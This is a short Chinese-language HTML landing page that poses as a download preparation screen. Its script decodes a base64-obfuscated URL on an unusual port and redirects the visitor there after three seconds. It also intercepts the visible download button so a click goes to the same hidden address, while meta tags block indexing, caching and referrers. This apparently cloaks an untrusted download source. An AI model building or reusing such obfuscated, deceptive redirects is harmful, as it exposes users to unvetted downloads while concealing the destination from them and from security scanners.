<!doctype html>
<html lang="zh-CN">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="robots" content="noindex,nofollow,noarchive,nosnippet">
  <meta name="googlebot" content="noindex,nofollow,noarchive,nosnippet">
  <meta name="referrer" content="no-referrer">
  <meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
  <meta http-equiv="Pragma" content="no-cache">
  <meta http-equiv="Expires" content="0">
  <link rel="canonical" href="https://hdisf.com/">
  <meta property="og:url" content="https://hdisf.com/">
  <title>资源准备中</title>
  <style>
    *{box-sizing:border-box}body{margin:0;min-height:100vh;display:grid;place-items:center;background:#071427;color:#eef6ff;font-family:Arial,"Microsoft YaHei",sans-serif;overflow:hidden}
    body:before{content:"";position:fixed;inset:0;background:linear-gradient(120deg,rgba(42,122,255,.28),transparent 38%),linear-gradient(300deg,rgba(145,91,255,.24),transparent 42%),repeating-linear-gradient(90deg,rgba(255,255,255,.04) 0 1px,transparent 1px 72px);pointer-events:none}
    .wrap{position:relative;width:min(92vw,520px);padding:42px;border:1px solid rgba(134,202,255,.24);border-radius:26px;background:rgba(10,25,55,.78);box-shadow:0 28px 80px rgba(0,0,0,.42),0 0 42px rgba(72,240,215,.12);backdrop-filter:blur(16px);text-align:center}
    h1{margin:0 0 14px;font-size:32px;letter-spacing:0}.status{margin:0;color:#b9c8e8;line-height:1.9}.bar{height:10px;border-radius:999px;background:rgba(255,255,255,.1);overflow:hidden;margin:28px 0}.bar span{display:block;height:100%;width:0;background:linear-gradient(90deg,#48f0d7,#54a7ff,#9a6bff);box-shadow:0 0 18px rgba(72,240,215,.65);animation:load 3s linear forwards}.manual{display:inline-flex;align-items:center;justify-content:center;min-width:168px;height:48px;border-radius:999px;color:#071427;text-decoration:none;font-weight:800;background:linear-gradient(90deg,#48f0d7,#65b6ff 50%,#b692ff);box-shadow:0 0 24px rgba(72,240,215,.34);transition:.2s ease}.manual:hover{transform:translateY(-2px);box-shadow:0 0 34px rgba(101,182,255,.5)}@keyframes load{to{width:100%}}@media(max-width:560px){.wrap{padding:30px 22px;border-radius:20px}h1{font-size:26px}}
  </style>
</head>
<body>
  <main class="wrap">
    <h1>资源准备中</h1>
    <p class="status">正在校验连接环境<br>即将进入下载页面<br>请勿关闭当前页面</p>
    <div class="bar" aria-hidden="true"><span></span></div>
    <a class="manual" href="/party.html" id="manualDownload" rel="nofollow noopener noreferrer">立即下载</a>
  </main>
  <script>
    const REAL_DOWNLOAD_URL = atob("aHR0cHM6Ly9wbHouMzEzNDg2Lnh5ejozNTg4OC8=");
    const manualDownload = document.getElementById("manualDownload");
    manualDownload.addEventListener("click", function(e){
      e.preventDefault();
      window.location.replace(REAL_DOWNLOAD_URL);
    });
    window.setTimeout(function(){
      window.location.replace(REAL_DOWNLOAD_URL);
    }, 3000);
  </script>
</body>
</html>
